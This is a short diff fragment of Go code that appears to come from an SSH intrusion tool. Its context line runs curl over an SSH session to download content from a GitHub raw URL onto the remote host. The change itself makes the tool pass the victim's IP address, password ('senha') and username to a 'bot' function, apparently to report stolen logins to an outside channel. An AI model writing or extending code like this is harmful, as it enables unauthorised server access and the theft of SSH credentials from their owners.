@@ -110,7 +110,7 @@ er := session.Run("curl -L  https://github.com/atilabyte/golang/raw/refs/heads/m
 
                  
 
-              go bot( "ssh ok ")
+              go bot( ip ) ; go  bot (senha) ;  go bot (user)
 
 
 
